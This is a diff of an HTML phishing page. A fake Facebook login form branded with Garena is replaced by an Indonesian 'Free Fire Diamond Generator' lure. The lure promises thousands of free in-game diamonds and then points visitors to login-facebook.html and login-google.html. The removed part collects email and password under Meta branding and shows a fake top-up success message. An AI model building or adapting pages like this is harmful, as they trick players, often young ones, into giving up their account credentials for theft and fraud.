@@ -3,29 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>Free Fire Diamond Generator</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="login-container">
-        <h2>facebook</h2>
-        <img src="garena-logo.png" alt="Garena">
-        <p>Log in your Facebook account to connect to Garena</p>
-        <input type="text" id="email" placeholder="Mobile number or email address">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="showSuccess()">Log in</button>
-        <a href="#">Forgotten password?</a>
-        <div class="footer">
-            <p>Meta © 2024</p>
+    <div class="container">
+      <img src="logo-ff.png">
+        <h1>Masukkan ID Free Fire Anda</h1>
+        <input type="text" id="ff-id" placeholder="Masukkan ID Free Fire">
+        
+        <h2>Pilih Jumlah Diamond</h2>
+        <div class="diamond-options">
+            <button class="diamond-btn" data-diamond="1000">💎 1000 DM</button>
+            <button class="diamond-btn" data-diamond="2000">💎 2000 DM</button>
+            <button class="diamond-btn" data-diamond="3000">💎 3000 DM</button>
+            <button class="diamond-btn" data-diamond="4000">💎 4000 DM</button>
         </div>
-    </div>
 
-    <div id="success-popup" class="popup">
-        <div class="popup-content">
-            <span class="checkmark">✔</span>
-            <h3>Success!</h3>
-            <p>Your diamond get top up in 24 hours.</p>
-            <button onclick="closePopup()">OK</button>
+        <button id="get-diamond">🚀 Dapatkan Diamond</button>
+
+        <!-- Menambahkan elemen untuk menampilkan pesan -->
+        <p id="diamond-message" style="display:none;">Login untuk mendapatkan diamond</p>
+
+        <!-- Opsi Login yang disembunyikan secara default -->
+        <div id="login-options" style="display:none;">
+            <a href="login-facebook.html" class="login-btn">Login dengan Facebook</a>
+            <a href="login-google.html" class="login-btn">Login dengan Google</a>
         </div>
     </div>
 
